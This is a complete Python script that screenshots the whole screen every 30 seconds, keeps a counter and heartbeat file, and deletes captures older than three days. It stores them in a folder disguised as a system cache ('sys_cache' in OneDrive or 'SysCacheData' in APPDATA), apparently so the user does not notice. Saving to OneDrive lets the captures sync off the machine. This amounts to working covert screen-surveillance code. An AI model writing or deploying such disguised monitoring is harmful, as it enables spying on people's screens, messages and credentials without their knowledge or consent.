import os
import time
import datetime
import sys
import logging
import pyautogui

onedrive = os.getenv("OneDrive")
if onedrive:
    BASE_DIR = os.path.join(onedrive, "sys_cache")
else:
    BASE_DIR = os.path.join(os.getenv("APPDATA"), "SysCacheData")

IMG_DIR = os.path.join(BASE_DIR, "img")
COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
STATUS_FILE = os.path.join(BASE_DIR, "status.txt")
LOG_FILE = os.path.join(BASE_DIR, "syscache.log")

INTERVAL = 30
RETENTION_DAYS = 3


def create_dirs():
    os.makedirs(BASE_DIR, exist_ok=True)
    os.makedirs(IMG_DIR, exist_ok=True)


def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )


def load_counter():
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except Exception:
            return 0
    return 0


def save_counter(counter):
    with open(COUNTER_FILE, "w", encoding="utf-8") as f:
        f.write(str(counter))


def save_number(counter, timestamp):
    file_path = os.path.join(BASE_DIR, f"{timestamp}.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(str(counter))


def heartbeat():
    with open(STATUS_FILE, "w", encoding="utf-8") as f:
        f.write(datetime.datetime.now().isoformat())


def take_screenshot(timestamp):
    filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
    ss = pyautogui.screenshot()
    ss.save(filepath)
    logging.info("Screenshot salva em %s", filepath)


def cleanup_old_files():
    now = time.time()
    cutoff = now - (RETENTION_DAYS * 86400)

    for root, _, files in os.walk(BASE_DIR):
        for file in files:
            path = os.path.join(root, file)

            if path in (COUNTER_FILE, STATUS_FILE, LOG_FILE):
                continue

            if os.path.isfile(path) and os.path.getmtime(path) < cutoff:
                try:
                    os.remove(path)
                    logging.info("Arquivo removido: %s", path)
                except Exception as e:
                    logging.error("Erro ao remover %s: %s", path, e)


def main_loop():
    counter = load_counter()

    while True:
        try:
            counter += 1
            timestamp = datetime.datetime.now().strftime("%Y_%m_%d-%H_%M_%S")

            save_number(counter, timestamp)
            take_screenshot(timestamp)
            save_counter(counter)
            heartbeat()
            cleanup_old_files()

        except Exception as e:
            logging.exception("Erro no loop principal: %s", e)

        time.sleep(INTERVAL)


if __name__ == "__main__":
    try:
        create_dirs()
        setup_logging()
        logging.info("Iniciando main_script")
        main_loop()
    except KeyboardInterrupt:
        sys.exit(0)